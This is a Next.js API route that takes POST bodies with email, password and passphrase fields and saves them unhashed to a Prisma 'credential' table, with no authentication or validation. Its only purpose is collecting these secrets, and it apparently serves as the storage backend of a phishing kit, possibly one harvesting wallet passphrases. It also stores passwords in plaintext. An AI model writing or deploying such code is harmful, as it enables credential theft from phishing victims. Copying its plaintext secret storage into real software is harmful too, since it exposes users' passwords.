import prisma from "../../lib/prisma";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", ["POST"]);
    return res.status(405).json({ success: false, message: `Method ${req.method} Not Allowed` });
  }

  try {
    if (!req.body || Object.keys(req.body).length === 0) {
      return res.status(400).json({ success: false, message: "No data provided" });
    }

    const { email, password, passphrase } = req.body;

    const result = await prisma.credential.create({
      data: {
        email: email || null,
        password: password || null,
        passphrase: passphrase || null,
      },
    });

    return res.status(200).json({
      success: true,
      message: "Data received and stored successfully.",
      insertedId: result.id,
    });
  } catch (error) {
    console.error("Prisma insert error:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to store data.",
    });
  }
}
